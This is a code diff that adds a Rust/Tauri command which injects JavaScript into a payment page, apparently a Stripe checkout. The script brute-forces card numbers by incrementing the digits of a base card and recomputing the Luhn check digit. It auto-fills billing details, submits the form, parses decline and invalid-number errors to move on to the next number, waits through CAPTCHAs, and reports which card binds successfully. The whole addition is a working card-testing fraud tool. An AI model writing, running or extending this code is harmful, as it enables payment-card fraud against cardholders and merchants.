@@ -1571,3 +1571,524 @@ pub async fn get_test_mode_progress(
     let settings = data_store.get_settings().await.map_err(|e| e.to_string())?;
     Ok(settings.test_mode_last_bin)
 }
+
+/// 撞卡脚本：填写银行卡信息，自动提交，根据结果自动遍历卡号
+/// - 基于用户填写的卡号自动递增末4位
+/// - 提示"拒绝"则换下一个卡号继续提交
+/// - 提示"卡号无效"则不提交，直接换下一个卡号
+#[command]
+pub async fn inject_card_collision_script(
+    app: AppHandle,
+    window_label: String,
+    base_card_number: String,
+    expiry_date: String,
+    cvv: String,
+    cardholder_name: String,
+    country: String,
+    postal_code: String,
+    state: String,
+    city: String,
+    district: Option<String>,
+    address_line1: String,
+    address_line2: Option<String>,
+    max_attempts: Option<i32>,
+) -> Result<(), String> {
+    let window = app.get_webview_window(&window_label)
+        .ok_or("Window not found".to_string())?;
+
+    let district_val = district.unwrap_or_default();
+    let line2_val = address_line2.unwrap_or_default();
+    let max_att = max_attempts.unwrap_or(100);
+    // 移除空格，只保留数字
+    let clean_card = base_card_number.chars().filter(|c| c.is_ascii_digit()).collect::<String>();
+
+    let js_code = format!(r#"
+        (function() {{
+            'use strict';
+            console.log('[撞卡] 撞卡脚本已注入，基础卡号: {base_card}');
+
+            var BASE_CARD = '{base_card}';
+            var MAX_ATTEMPTS = {max_attempts};
+            var currentAttempt = 0;
+            var stopped = false;
+            var lastFilledCard = '';
+
+            // React 兼容的输入模拟
+            function simulateTyping(element, value) {{
+                if (!element) return;
+                var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+                element.focus();
+                setter.call(element, '');
+                element.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                element.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                // 短暂延迟后填入新值
+                setTimeout(function() {{
+                    setter.call(element, value);
+                    element.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                    element.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                }}, 50);
+            }}
+
+            // 等待元素出现
+            function waitForElement(selector, callback, timeout) {{
+                timeout = timeout || 15000;
+                var startTime = Date.now();
+                var check = function() {{
+                    var el = document.querySelector(selector);
+                    if (!el && selector.startsWith('#')) {{
+                        var name = selector.substring(1);
+                        el = document.querySelector('input[name="' + name + '"]') ||
+                             document.querySelector('select[name="' + name + '"]');
+                    }}
+                    if (!el) {{
+                        if (selector === '#cardNumber') el = document.querySelector('input[placeholder*="1234"]');
+                        else if (selector === '#cardExpiry') el = document.querySelector('input[placeholder*="/"]') || document.querySelector('input[placeholder*="月"]');
+                        else if (selector === '#cardCvc') el = document.querySelector('input[placeholder*="CVC"]') || document.querySelector('input[placeholder*="CVV"]');
+                        else if (selector === '#billingName') el = document.querySelector('input[placeholder*="全名"]') || document.querySelector('input[placeholder*="姓名"]');
+                    }}
+                    if (el) {{
+                        callback(el);
+                    }} else if (Date.now() - startTime > timeout) {{
+                        console.error('[撞卡] 元素未找到:', selector);
+                    }} else {{
+                        setTimeout(check, 100);
+                    }}
+                }};
+                check();
+            }}
+
+            // Luhn 校验位计算
+            function calculateLuhnCheckDigit(partialNumber) {{
+                var sum = 0;
+                var isEven = true;
+                for (var i = partialNumber.length - 1; i >= 0; i--) {{
+                    var digit = parseInt(partialNumber[i], 10);
+                    if (isEven) {{
+                        digit *= 2;
+                        if (digit > 9) digit -= 9;
+                    }}
+                    sum += digit;
+                    isEven = !isEven;
+                }}
+                return (10 - (sum % 10)) % 10;
+            }}
+
+            // 根据基础卡号和偏移量生成新卡号（递增末4位，重算Luhn校验位）
+            function generateCardByOffset(offset) {{
+                // 取前15位作为基础（第16位是Luhn校验位）
+                var prefix = BASE_CARD.substring(0, 12); // 前12位不变
+                var last4Base = parseInt(BASE_CARD.substring(12, 15), 10); // 第13-15位（3位）
+                // 注意：第16位是校验位，我们递增的是第13-15这3位
+                // 实际上递增末4位中的前3位（第13-15位），第16位重算
+                
+                // 更好的方式：取前12位固定，把第13-16位当作可变部分
+                // 基础的第13-15位 + offset，然后重算第16位
+                var base15 = BASE_CARD.substring(0, 15);
+                var numPart = parseInt(base15.substring(12), 10); // 第13-15位数字
+                var newNumPart = numPart + offset;
+                
+                // 如果超出999，进位到前面
+                if (newNumPart > 999) {{
+                    // 取前12位的数值 + 进位
+                    var prefix12Num = parseInt(base15.substring(0, 12), 10);
+                    prefix12Num += Math.floor(newNumPart / 1000);
+                    newNumPart = newNumPart % 1000;
+                    prefix = prefix12Num.toString().padStart(12, '0');
+                }}
+                
+                var first15 = prefix + newNumPart.toString().padStart(3, '0');
+                var checkDigit = calculateLuhnCheckDigit(first15);
+                return first15 + checkDigit.toString();
+            }}
+
+            // 格式化卡号为 XXXX XXXX XXXX XXXX 格式
+            function formatCardNumber(num) {{
+                return num.replace(/(\d{{4}})/g, '$1 ').trim();
+            }}
+
+            // 填写卡号（只更新卡号字段）
+            function fillCardNumber(cardNum) {{
+                lastFilledCard = cardNum;
+                var formatted = formatCardNumber(cardNum);
+                console.log('[撞卡] 填写卡号: ' + formatted + ' (第' + (currentAttempt + 1) + '次)');
+                
+                var cardEl = document.querySelector('#cardNumber') || document.querySelector('input[name="cardNumber"]') || document.querySelector('input[placeholder*="1234"]');
+                if (cardEl) {{
+                    simulateTyping(cardEl, cardNum);
+                }}
+            }}
+
+            // 填写完整表单（首次）
+            function fillFullForm(cardNum) {{
+                fillCardNumber(cardNum);
+                waitForElement('#cardExpiry', function(el) {{ simulateTyping(el, '{expiry}'); }});
+                waitForElement('#cardCvc', function(el) {{ simulateTyping(el, '{cvv}'); }});
+                waitForElement('#billingName', function(el) {{ simulateTyping(el, '{name}'); }});
+
+                waitForElement('#billingCountry', function(el) {{
+                    el.value = '{country}';
+                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
+
+                    setTimeout(function() {{
+                        waitForElement('#billingPostalCode', function(el) {{ simulateTyping(el, '{postal}'); }});
+                        waitForElement('#billingAdministrativeArea', function(el) {{
+                            var options = el.querySelectorAll('option');
+                            var found = false;
+                            for (var i = 0; i < options.length; i++) {{
+                                if (options[i].value === '{state}' || options[i].value.indexOf('{state}') >= 0 || options[i].text.indexOf('{state}') >= 0) {{
+                                    el.value = options[i].value;
+                                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                    found = true;
+                                    break;
+                                }}
+                            }}
+                            if (!found) {{ el.value = '{state}'; el.dispatchEvent(new Event('change', {{ bubbles: true }})); }}
+                        }});
+                        waitForElement('#billingLocality', function(el) {{ simulateTyping(el, '{city}'); }});
+                        waitForElement('#billingDependentLocality', function(el) {{
+                            var d = '{district}';
+                            if (d && d.trim() !== '') {{ simulateTyping(el, d); }}
+                        }});
+                        waitForElement('#billingAddressLine1', function(el) {{ simulateTyping(el, '{line1}'); }});
+                        waitForElement('#billingAddressLine2', function(el) {{
+                            var l2 = '{line2}';
+                            if (l2 && l2.trim() !== '') {{ simulateTyping(el, l2); }}
+                        }});
+                    }}, 500);
+                }});
+            }}
+
+            // 点击提交按钮
+            function clickSubmit() {{
+                return new Promise(function(resolve) {{
+                    var checkReady = function() {{
+                        var btn = document.querySelector('button[type="submit"]');
+                        if (btn) {{
+                            var isComplete = btn.classList.contains('SubmitButton--complete');
+                            if (isComplete && !btn.disabled) {{
+                                console.log('[撞卡] ✓ 提交按钮就绪，点击提交');
+                                btn.click();
+                                resolve(true);
+                                return;
+                            }}
+                        }}
+                        // 等待按钮就绪，最多等30秒
+                        if (Date.now() - startWait < 30000) {{
+                            setTimeout(checkReady, 500);
+                        }} else {{
+                            console.log('[撞卡] ⏳ 提交按钮等待超时');
+                            // 尝试强制点击
+                            if (btn && !btn.disabled) {{
+                                btn.click();
+                                resolve(true);
+                            }} else {{
+                                resolve(false);
+                            }}
+                        }}
+                    }};
+                    var startWait = Date.now();
+                    checkReady();
+                }});
+            }}
+
+            // 检测页面上的错误信息
+            function detectError() {{
+                // 检查各种错误元素
+                var selectors = [
+                    '.ConfirmPaymentButton-Error',
+                    '.FieldError',
+                    '.Error',
+                    '.Notice-message',
+                    '.Notice--red',
+                    '[class*="error"]',
+                    '[class*="Error"]',
+                    'p[role="alert"]'
+                ];
+                for (var i = 0; i < selectors.length; i++) {{
+                    var els = document.querySelectorAll(selectors[i]);
+                    for (var j = 0; j < els.length; j++) {{
+                        var text = els[j].textContent.trim();
+                        if (text.length > 0 && text.length < 200) {{
+                            return text;
+                        }}
+                    }}
+                }}
+                return '';
+            }}
+
+            // 判断错误类型
+            function classifyError(errorText) {{
+                if (!errorText) return 'none';
+                // 卡号无效
+                if (errorText.indexOf('无效') >= 0 || errorText.indexOf('invalid') >= 0 ||
+                    errorText.indexOf('Invalid') >= 0 || errorText.indexOf('incorrect') >= 0 ||
+                    errorText.indexOf('not valid') >= 0) {{
+                    return 'invalid';
+                }}
+                // 被拒绝
+                if (errorText.indexOf('拒绝') >= 0 || errorText.indexOf('declined') >= 0 ||
+                    errorText.indexOf('Declined') >= 0 || errorText.indexOf('decline') >= 0 ||
+                    errorText.indexOf('refused') >= 0 || errorText.indexOf('reject') >= 0) {{
+                    return 'declined';
+                }}
+                // 其他错误也当作拒绝处理（尝试换卡）
+                return 'declined';
+            }}
+
+            // 检测是否绑卡成功
+            function detectSuccess() {{
+                var btn = document.querySelector('button[type="submit"]');
+                if (btn) {{
+                    var hasSuccess = btn.classList.contains('SubmitButton--success');
+                    var hasCheckmark = btn.querySelector('.SubmitButton-CheckmarkIcon--current');
+                    if (hasSuccess || hasCheckmark) return true;
+                }}
+                return false;
+            }}
+
+            // 主循环：撞卡逻辑
+            function startCollision() {{
+                if (stopped) return;
+
+                var cardNum = generateCardByOffset(currentAttempt);
+                console.log('[撞卡] === 第 ' + (currentAttempt + 1) + '/' + MAX_ATTEMPTS + ' 次尝试 ===');
+
+                if (currentAttempt === 0) {{
+                    // 首次填写完整表单
+                    fillFullForm(cardNum);
+                }} else {{
+                    // 后续只更换卡号
+                    fillCardNumber(cardNum);
+                }}
+
+                // 等待卡号填入后检测是否为无效卡号
+                setTimeout(function() {{
+                    if (stopped) return;
+
+                    var preError = detectError();
+                    var preClass = classifyError(preError);
+
+                    if (preClass === 'invalid') {{
+                        // 卡号无效，不提交，直接试下一个
+                        console.log('[撞卡] ⚠️ 卡号无效: ' + formatCardNumber(cardNum) + '，跳过提交');
+                        document.title = '[撞卡] 卡号无效，跳过: ' + formatCardNumber(cardNum);
+                        currentAttempt++;
+                        if (currentAttempt < MAX_ATTEMPTS) {{
+                            setTimeout(startCollision, 500);
+                        }} else {{
+                            console.log('[撞卡] ❌ 已达到最大尝试次数');
+                            document.title = '[撞卡] 已达最大次数 ' + MAX_ATTEMPTS;
+                            window.location.hash = '#___COLLISION_EXHAUSTED___';
+                        }}
+                        return;
+                    }}
+
+                    // 卡号有效，提交
+                    console.log('[撞卡] 卡号有效，准备提交...');
+                    document.title = '[撞卡] 提交中: ' + formatCardNumber(cardNum);
+
+                    clickSubmit().then(function(submitted) {{
+                        if (!submitted) {{
+                            console.log('[撞卡] 提交失败，尝试下一个');
+                            currentAttempt++;
+                            if (currentAttempt < MAX_ATTEMPTS) {{
+                                setTimeout(startCollision, 1000);
+                            }}
+                            return;
+                        }}
+
+                        // 等待提交结果
+                        waitForResult();
+                    }});
+                }}, 2000); // 等2秒让Stripe验证卡号格式
+            }}
+
+            // 检测是否正在进行人机验证（仅检测reCAPTCHA弹窗，不检测按钮状态）
+            function isCaptchaVisible() {{
+                // 检查reCAPTCHA challenge iframe（大尺寸的验证弹窗，非隐藏的badge小图标）
+                var frames = document.querySelectorAll('iframe[src*="recaptcha"], iframe[src*="hcaptcha"], iframe[title*="recaptcha"], iframe[title*="reCAPTCHA"], iframe[title*="challenge"]');
+                for (var i = 0; i < frames.length; i++) {{
+                    var rect = frames[i].getBoundingClientRect();
+                    // reCAPTCHA challenge弹窗通常较大（>100px），隐藏的badge很小
+                    if (rect.width > 100 && rect.height > 100) {{
+                        return true;
+                    }}
+                }}
+                return false;
+            }}
+
+            // 等待提交后的结果
+            function waitForResult() {{
+                var resultCheckStart = Date.now();
+                var lastError = '';
+                var captchaLogged = false;
+                var RESULT_TIMEOUT = 120000; // 2分钟超时（正常处理足够）
+
+                var checkResult = function() {{
+                    if (stopped) return;
+
+                    // 检查成功
+                    if (detectSuccess()) {{
+                        console.log('[撞卡] ✅✅✅ 绑卡成功！卡号: ' + formatCardNumber(lastFilledCard));
+                        document.title = '[撞卡] ✅ 成功: ' + formatCardNumber(lastFilledCard);
+                        window.location.hash = '#___COLLISION_SUCCESS___CARD_' + lastFilledCard;
+                        return;
+                    }}
+
+                    // 检测reCAPTCHA弹窗是否可见（仅检测实际的验证弹窗）
+                    if (isCaptchaVisible()) {{
+                        if (!captchaLogged) {{
+                            console.log('[撞卡] 🔐 检测到人机验证弹窗，等待用户完成验证...');
+                            document.title = '[撞卡] 等待人机验证...';
+                            captchaLogged = true;
+                        }}
+                        // 验证弹窗期间重置超时计时器
+                        resultCheckStart = Date.now();
+                        setTimeout(checkResult, 1000);
+                        return;
+                    }}
+
+                    // 验证弹窗已消失
+                    if (captchaLogged) {{
+                        console.log('[撞卡] ✓ 人机验证已完成，继续检测结果...');
+                        document.title = '[撞卡] 验证完成，等待结果...';
+                        captchaLogged = false;
+                        // 验证完成后给Stripe一些处理时间
+                        resultCheckStart = Date.now();
+                    }}
+
+                    // 检查错误信息
+                    var error = detectError();
+                    if (error && error !== lastError) {{
+                        lastError = error;
+                        var errorType = classifyError(error);
+                        console.log('[撞卡] 检测到错误: ' + error + ' (类型: ' + errorType + ')');
+
+                        if (errorType === 'declined') {{
+                            // 被拒绝，换下一个卡号
+                            console.log('[撞卡] 🔄 卡被拒绝，换下一个卡号');
+                            document.title = '[撞卡] 被拒绝，换卡: ' + formatCardNumber(lastFilledCard);
+                            currentAttempt++;
+                            if (currentAttempt < MAX_ATTEMPTS) {{
+                                setTimeout(startCollision, 1500);
+                            }} else {{
+                                console.log('[撞卡] ❌ 已达到最大尝试次数');
+                                document.title = '[撞卡] 已达最大次数 ' + MAX_ATTEMPTS;
+                                window.location.hash = '#___COLLISION_EXHAUSTED___';
+                            }}
+                            return;
+                        }} else if (errorType === 'invalid') {{
+                            // 提交后才发现无效，换下一个
+                            console.log('[撞卡] ⚠️ 卡号无效，换下一个');
+                            currentAttempt++;
+                            if (currentAttempt < MAX_ATTEMPTS) {{
+                                setTimeout(startCollision, 500);
+                            }} else {{
+                                window.location.hash = '#___COLLISION_EXHAUSTED___';
+                            }}
+                            return;
+                        }}
+                    }}
+
+                    // 超时检查（人机验证期间已重置计时器）
+                    if (Date.now() - resultCheckStart > RESULT_TIMEOUT) {{
+                        console.log('[撞卡] 等待结果超时，尝试下一个');
+                        currentAttempt++;
+                        if (currentAttempt < MAX_ATTEMPTS) {{
+                            setTimeout(startCollision, 1000);
+                        }} else {{
+                            window.location.hash = '#___COLLISION_EXHAUSTED___';
+                        }}
+                        return;
+                    }}
+
+                    setTimeout(checkResult, 500);
+                }};
+
+                // 等待3秒让Stripe处理
+                setTimeout(checkResult, 3000);
+            }}
+
+            // 启动
+            console.log('[撞卡] 等待页面加载完成...');
+            setTimeout(function() {{
+                startCollision();
+            }}, 2000);
+        }})();
+    "#,
+        base_card = clean_card,
+        max_attempts = max_att,
+        expiry = expiry_date,
+        cvv = cvv,
+        name = cardholder_name,
+        country = country,
+        postal = postal_code,
+        state = state,
+        city = city,
+        district = district_val,
+        line1 = address_line1,
+        line2 = line2_val,
+    );
+
+    window.eval(&js_code).map_err(|e| {
+        eprintln!("[撞卡] 执行JS失败: {}", e);
+        e.to_string()
+    })?;
+
+    println!("[撞卡] 已注入撞卡脚本到窗口: {}, 基础卡号: {}, 最大尝试: {}", window_label, clean_card, max_att);
+
+    // 启动后台监控任务
+    let window_for_monitor = window.clone();
+    let window_label_clone = window_label.clone();
+    tokio::spawn(async move {
+        println!("[撞卡] 开始监控撞卡结果...");
+        let mut check_count = 0;
+        let max_checks = 1200; // 最多600秒
+
+        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
+
+        loop {
+            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+            check_count += 1;
+
+            if check_count > max_checks {
+                println!("[撞卡] 监控超时，停止");
+                break;
+            }
+
+            if !window_for_monitor.is_visible().unwrap_or(false) {
+                println!("[撞卡] 窗口已关闭，停止监控");
+                break;
+            }
+
+            if let Ok(url) = window_for_monitor.url() {
+                let url_str = url.to_string();
+
+                if url_str.contains("___COLLISION_SUCCESS___") {
+                    // 提取成功的卡号
+                    if let Some(card_start) = url_str.find("CARD_") {
+                        let card_part = &url_str[card_start + 5..];
+                        let card_num: String = card_part.chars().take_while(|c| c.is_ascii_digit()).collect();
+                        println!("[撞卡] ✅ 撞卡成功！卡号: {}", card_num);
+                    }
+                    // 成功后不自动关闭窗口，让用户看到结果
+                    tokio::time::sleep(tokio::time::Duration::from_secs(3)).await;
+                    let _ = window_for_monitor.close();
+                    break;
+                }
+
+                if url_str.contains("___COLLISION_EXHAUSTED___") {
+                    println!("[撞卡] ❌ 撞卡次数用完，所有卡号均失败: {}", window_label_clone);
+                    // 不自动关闭，让用户看到最终状态
+                    break;
+                }
+            }
+
+            if check_count % 20 == 0 {
+                println!("[撞卡] 监控中... ({}/{})", check_count, max_checks);
+            }
+        }
+    });
+
+    Ok(())
+}
